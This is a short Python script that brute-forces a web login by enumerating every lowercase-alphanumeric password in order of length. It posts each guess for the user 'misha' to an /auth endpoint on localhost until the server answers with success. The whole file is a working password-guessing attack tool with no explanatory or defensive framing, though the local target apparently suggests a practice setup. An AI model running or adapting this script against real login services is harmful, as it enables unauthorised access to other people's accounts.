import requests

alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
base = len(alphabet)

length = 0
counter = 0

while True:
    password = ''
    c = counter
    while c > 0:
        rest = c % base
        c = c // base
        password = alphabet[rest] + password

    while len(password) < length:
        password = alphabet[0] + password

    print(counter, password)
    response = requests.post(
        'http://127.0.0.1:5000/auth',
        json={'login': 'misha', 'password': password}
    )
    if response.status_code == 200:
        print("SUCCESS", password)
        break

    if password == alphabet[-1] * length:
        length += 1
        counter = 0
    else:
        counter += 1

